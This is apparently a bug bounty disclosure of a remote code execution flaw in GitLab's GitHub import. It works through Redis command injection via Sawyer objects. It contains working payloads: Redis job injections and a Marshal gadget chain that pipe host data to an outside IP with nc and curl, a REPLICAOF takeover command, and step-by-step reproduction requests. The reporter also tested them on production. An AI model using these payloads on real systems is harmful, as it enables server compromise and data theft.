## Details
Hello,

While continuing mining on [github import](https://hackerone.com/reports/1665658), I found a vulnerability on gitlab.com allowing to execute remotely arbitrary commands.

Gitlab uses Octokit to get data from github.com. Octokit uses [Sawyer::Resource](https://github.com/lostisland/sawyer/blob/master/lib/sawyer/resource.rb) to represent results.

Sawyer is a crazy class that [converts](https://github.com/lostisland/sawyer/blob/f5f080d5c5260e094069139ffc7c13d0acba4ab5/lib/sawyer/resource.rb#L81) a hash to an object whose methods are based on the hash's key:

```ruby
irb(main):641:0> Sawyer::VERSION
=> "0.8.2"
irb(main):642:0> a = Sawyer::Resource.new( Sawyer::Agent.new(""), to_s: "example", length: 1)
=> 
{:to_s=>"example", :length=>1}
...
irb(main):643:0> a.to_s
=> "example"
irb(main):644:0> a.length
=> 1
```

Gitlab uses directly the responded Sawyer object in few functions, such as, the `id` variable in [this function](https://gitlab.com/gitlab-org/gitlab/-/blob/99f5db917a33ad9466f35918a1da454ed397be8e/lib/gitlab/github_import/parallel_scheduling.rb#L145):

```ruby
      def already_imported?(object)
        id = id_for_already_imported_cache(object)

        Gitlab::Cache::Import::Caching.set_includes?(already_imported_cache_key, id)
      end
```

Normally, `id` should be a number. However when `id` is `{"to_s": {"bytesize": 2, "to_s": "1234REDIS_COMMANDS" }}`, we can inject additional redis commands by using `bytesize` to limit the previous command when it [is constructed](https://github.com/redis/redis-rb/blob/v4.4.0/lib/redis/connection/command_helper.rb#L8) (although the `bytesize` is `2` we need to reserve 4 bytes as 2 additional bytes for CLRF):

```ruby
      def build_command(args)
        command = [nil]

        args.each do |i|
          if i.is_a? Array
            i.each do |j|
              j = j.to_s
              command << "$#{j.bytesize}"
              command << j
            end
          else
            i = i.to_s
            command << "$#{i.bytesize}"
            command << i
          end
        end
```

As we can execute any redis commands, we can escalate to execute any Bash command by using an existing gadget, for example:

```
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'| (hostname; ps aux)  | nc 51.75.74.52 11211  \').read\"],"queue\":\"system_hook_push\"}"
```

I tested this redis command first on my own gitlab instance and it worked. 

I then tested on gitlab.com but got nothing. I tried another by replacing basically `nc` by `curl` but no luck:

```
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"PagesWorker\",\"args\":[\"class_eval\",\"IO.read('|(hostname; ps aux) | curl 51.75.74.52:11211 -X POST --data-binary @-  ')\"], \"queue\":\"system_hook_push\"}"
```

Although the gadget above works well on my local instance but gitlab SaaS which may be protected somehow or used another redis namespace for Sidekiq, even another redis instance. So I used then the basic redis command `REPLICAOF 51.75.74.52 11211\n\n` to test gitlab.com and I got a ping from your redis server to my server `nc -vlkp 11211`:

{F1871024}

This means that I have the full control on the redis. After seeing the pings, I immediately turned off the replication by executing the redis command `REPLICAOF no one\n\n`. No information from your redis server has been replicated to mine as I used `nc` and I got only the `ping` messages.


By checking on my local instance at `/var/opt/gitlab/redis/redis.conf`, I see that only `keys` command is disable. I did not try `FLUSHALL` to write data to file as it is too dangerous.

As gitlab uses redis as a cache storage, so I tried to reach RCE via `Marshal.dump` method. I tested the following payload on gitlab.com to poison the avatar of my project via the key `cache:gitlab:avatar:yvvdwf/xss:16210710`:

```
\r\n*3\r\n$3\r\nset\r\n$39\r\ncache:gitlab:avatar:yvvdwf/xss:16210710\r\n$347\r\n\u0004\b[\bc\u0015Gem::SpecFetcherc\u0013Gem::InstallerU:\u0015Gem::Requirement[\u0006o:\u001cGem::Package::TarReader\u0006:\b@ioo:\u0014Net::BufferedIO\u0007;\u0007o:#Gem::Package::TarReader::Entry\u0007:\n@readi\u0000:\f@headerI\"\u0006a\u0006:\u0006ET:\u0012@debug_outputo:\u0016Net::WriteAdapter\u0007:\f@socketo:\u0014Gem::RequestSet\u0007:\n@setso;\u000e\u0007;\u000fm\u000bKernel:\u000f@method_id:\u000bsystem:\r@git_setI\".(hostname; ps aux) | nc 51.75.74.52 11211\u0006;\fT;\u0012:\fresolve\r\n\r\n
```

Although I did not get RCE but it seems working as I got `500` error code when trying to access to my project. And now I cannot access to my project via web interface. I think I should stop testing to avoid any further potential incidences. I did all the tests above on gitlab.com on 16-17 August 2022 from IP `51.75.74.52`

# Steps to reproduce

The steps to reproduce should be the same as this [one](https://hackerone.com/reports/1665658)

The following steps are to reproduce on a local gitlab instance whose domain is `http://gitlab.example.com`:

# Step to reproduce

To reproduce, we need the following prerequisite: 

- A VM/machine to host the dummy server  with an public IP though that gitlab.example.com can access to (or you can configure your gitlab instance to allow to access to local networks)
- I created the dummy server using nodejs, so you need to have also nodejs on the machine
- A Gitlab personal access token. Go to http://gitlab.example.com/-/profile/personal_access_tokens?scopes=api to create a new token with within `api` scope.


# Step 1: run the dummy server

- Copy the attachment file on your machine and decompress it to any folder, e.g., `/tmp/dummy-server`
- *Modify the attack payload* as you need inside `redis_command.txt` file, the default value is to execute the command `(hostname; ps aux) > /tmp/ahihi`:
```
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"PagesWorker\",\"args\":[\"class_eval\",\"IO.read('|(hostname; ps aux) > /tmp/ahihi ')\"], \"queue\":\"system_hook_push\"}"
```
- Go to `/tmp/dummy-server` then run this command: `node ./index.js YOUR_IP YOUR_PORT` in which, you should replace `IP` and `PORT` with the one you have. For example, `sudo node index.js 51.75.74.52 80`

# Step 2: trigger Gitlab import

- Open a new terminal, then run the following command, in which:

   + `YOUR_IP` and `YOUR_PORT` are the values in the previous step
   + `YOUR_GITLAB_TOKEN` is the api token you've created in the pre-requirement
   + `YOUR_GITLAB_USERNAME` is the target namespace you want to import the project to. It can be your username, or a group name

```bash
curl -kv "http://gitlab.example.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: YOUR_GITLAB_TOKEN" \
  --data '{
    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "repo_id": "356289002",
    "target_namespace": "YOUR_GITLAB_USERNAME",
    "new_name": "poc-rce",
    "github_hostname": "http://YOUR_IP:YOUR_PORT"
}'
```

For example:

```bash
curl "http://gitlab.example.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: 3LCvKWXVF-Gadcnbxxxx" \
  --data '{
    "personal_access_token": "xxxxx",
    "repo_id": "356289002",
    "target_namespace": "root",
    "new_name": "NEW-NAME-'$(date +%s)'",
    "github_hostname": "http://ns.yvvdwf.me:80"
}'
```

- View the result in `/etc/ahihi`

## Impact

Any one the the ability to call `api/v4/import/github` endpoint could achieve RCE via a specially crafted responses
